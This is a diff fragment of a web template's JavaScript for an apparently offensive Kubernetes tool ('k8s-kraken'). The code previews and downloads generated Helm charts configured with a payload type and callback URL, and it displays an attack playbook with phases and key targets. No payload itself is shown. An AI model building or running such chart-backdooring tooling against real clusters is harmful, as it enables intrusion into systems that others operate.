+            <div class="file-tree-item text-gray-300 ${index === 0 ? 'active' : ''}" onclick="previewHelmFile('${file}', this)">
+                <i class="fas fa-${icon} mr-2 text-cyan-400"></i>${file}
+            </div>
+        `;
+    });
+    
+    html += `
+                </div>
+            </div>
+            <div class="md:col-span-2">
+                <h5 class="text-gray-300 font-bold mb-2">File Preview</h5>
+                <pre id="helmFilePreview" class="bg-black/50 text-green-400 p-4 rounded-lg overflow-auto max-h-[350px] text-xs font-mono">${chart.files[files[0]] || 'Click a file to preview'}</pre>
+            </div>
+        </div>
+    `;
+    
+    document.getElementById('helmResults').innerHTML = html;
+}
+
+function previewHelmFile(filename, element) {
+    if (currentHelmChart && currentHelmChart.files[filename]) {
+        document.getElementById('helmFilePreview').textContent = currentHelmChart.files[filename];
+        
+        // Update active state
+        document.querySelectorAll('.file-tree-item').forEach(el => el.classList.remove('active'));
+        element.classList.add('active');
+    }
+}
+
+// Download Helm Chart
+async function downloadHelmChart() {
+    if (!currentHelmChart) return;
+    
+    try {
+        const response = await fetch('/k8s-kraken/api/helm/download', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chart_type: document.getElementById('helmChartType').value,
+                payload_type: document.getElementById('helmPayloadType').value,
+                callback_url: document.getElementById('helmCallback').value,
+                version: document.getElementById('helmVersion').value,
+                include_daemonset: document.getElementById('helmDaemonset').checked
+            })
+        });
+        
+        const blob = await response.blob();
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = currentHelmChart.name + '-chart.zip';
+        a.click();
+    } catch (error) {
+        alert('Download error: ' + error.message);
+    }
+}
+
+// Load Attack Playbook
+async function loadPlaybook() {
+    try {
+        const response = await fetch('/k8s-kraken/api/attack-playbook');
+        const data = await response.json();
+        
+        if (data.success) {
+            displayPlaybook(data.playbook);
+        }
+    } catch (error) {
+        document.getElementById('playbookContent').innerHTML = 
+            '<div class="p-4 bg-red-500/20 border border-red-500/50 rounded-lg text-red-400">Failed to load playbook</div>';
+    }
+}
+
+function displayPlaybook(playbook) {
+    let html = `<h4 class="text-green-400 font-bold text-xl mb-6">${playbook.title}</h4>`;
+    
+    playbook.phases.forEach(phase => {
+        html += `
+            <div class="playbook-phase">
+                <div class="flex items-center gap-4 mb-4">
+                    <span class="w-10 h-10 rounded-full bg-green-500/20 text-green-400 flex items-center justify-center font-bold text-lg">
+                        ${phase.phase}
+                    </span>
+                    <h5 class="text-white font-bold text-lg">${phase.name}</h5>
+                </div>
+                <ul class="list-disc list-inside text-gray-300 space-y-2 ml-14">
+        `;
+        phase.steps.forEach(step => {
+            html += `<li>${step}</li>`;
+        });
+        html += '</ul></div>';
+    });
+    
+    html += `
+        <div class="playbook-phase border border-yellow-500/30">
+            <h5 class="text-yellow-400 font-bold mb-3"><i class="fas fa-bullseye mr-2"></i>Key Targets</h5>
+            <ul class="list-disc list-inside text-gray-300 space-y-2">
+    `;
+    playbook.key_targets.forEach(target => {
+        html += `<li>${target}</li>`;
+    });
+    html += '</ul></div>';
+    
+    document.getElementById('playbookContent').innerHTML = html;
+}
+</script>
+{% endblock %}
